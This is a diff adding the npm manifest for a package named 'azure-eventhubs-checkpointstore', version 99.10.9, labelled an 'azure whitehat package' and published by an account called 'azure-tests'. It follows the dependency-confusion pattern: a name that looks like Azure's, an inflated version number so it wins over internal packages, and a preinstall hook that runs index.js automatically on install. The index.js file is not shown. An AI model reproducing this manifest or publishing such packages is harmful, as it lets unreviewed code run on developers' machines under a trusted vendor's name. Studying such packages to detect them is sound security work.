@@ -1,0 +1,39 @@
+{
+    "name": "azure-eventhubs-checkpointstore",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-eventhubs-checkpointstore@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-0qsM7sBgrdpDcqCWVAMc8moRfMKw57wyXd2yGyfbuOjdn9qL9S1yCqsGmnnh6SPkUEoolMgGRMrYyeXzNYURXA==",
+        "shasum": "3dd71990410ecab1d516ac7ad4e9f6fcd9cda316",
+        "tarball": "https://registry.npmjs.org/azure-eventhubs-checkpointstore/-/azure-eventhubs-checkpointstore-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3595,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoS1oCRA9TVsSAnZWagAALmYP/1Yi0uC2fxJcOVK2hiiN\ns/OdjHKLS1tet9EYmk4NMb6/KayQMTsvHDYaYrlaU0tMhOBpNEJrDpTWW57k\nM8npVQATth+6UNQzeYrLOvpolCAg396LyzY40aJgNhSkKXUhLUrQnrEmgfDC\nn9l+0R2FKJreQqsJ70VNkqYQ19ZVkQQkiCa901Gv2SFjMAWMs62a+Ccie8eS\nc70NVcluu2+tpaTPMThhcvotJIJj43D4PO6OFpOFlkCLgSXgk7d5ZlS4w6id\nS5q+lLVxFCJbb2n2qU90YcIz9rvGemXa1dNwdfb8QFjDLpbD+zoL8Yhu5VCj\nm8NO5mPq2FXdabCz628Vwcdqjq8WPxFUsaUDbl4vif7kBnIJ76VY6lLAhT8j\n0ABz98HIUpKkl94B1SvthNaFamahi9OkT5r/o79Og2KGQXnfRYYZmlpfIJna\nJrYhY97dJeddWuGZ2JZJHGnso/OaEXu916B66lL90y3rqlGMURMxYFSUVeAl\nAiR9fLjLBxIFTbu64ClsndRs4IDS7gJK/5TcvYLa/FX2RP8WdgrNrNAqeRFf\nr7KxMRIxloeOOXqlbzdW3JSxM6W/9wc5kMsW9Z4IivBb8jEtNhSsMBFT2t13\nFIqnoRIPbYkdo70h04XPYg19lBCA/Jw07S6uuXOUXfKW+iMUy0qTOa/kOXbV\nKXr1\r\n=6MhE\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-eventhubs-checkpointstore_99.10.9_1637952871953_0.012653685867638709"
+    },
+    "_hasShrinkwrap": false
+}
